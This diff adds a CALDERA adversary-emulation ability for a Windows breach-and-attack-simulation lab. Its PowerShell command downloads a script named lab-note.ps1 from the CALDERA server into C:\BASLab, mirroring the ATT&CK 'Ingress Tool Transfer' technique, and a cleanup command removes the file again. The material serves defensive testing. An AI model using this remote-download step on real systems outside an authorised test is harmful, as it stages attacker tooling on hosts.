@@ -1,0 +1,26 @@
+- id: 72afaf5a-b793-4301-a791-8dff54918e4e
+  name: Download lab script from CALDERA
+  description: Windows BAS lab ability for File Delivery and Execution Lab
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: '$dir=''C:\BASLab\delivery-test''; New-Item -ItemType Directory -Path
+          $dir -Force | Out-Null; $path=Join-Path $dir ''lab-note.ps1''; Invoke-WebRequest
+          -UseBasicParsing -Method Post -Uri ''#{server}/file/download'' -Headers
+          @{file=''lab-note.ps1''} -OutFile $path -ErrorAction Stop; if ((Get-Item
+          -LiteralPath $path).Length -eq 0) { throw ''Downloaded file is empty'' };
+          Write-Output $path
+
+          '
+        timeout: 60
+        cleanup: $dir='C:\BASLab\delivery-test'; foreach($name in @('executed.marker','lab-note.ps1'))
+          { $file=Join-Path $dir $name; if ([System.IO.File]::Exists($file)) { [System.IO.File]::Delete($file)
+          } }; if ([System.IO.Directory]::Exists($dir) -and -not (Get-ChildItem -LiteralPath
+          $dir -Force)) { [System.IO.Directory]::Delete($dir) }
+        parsers:
+        - plugins.stockpile.app.parsers.basic:
+          - source: host.file.downloaded
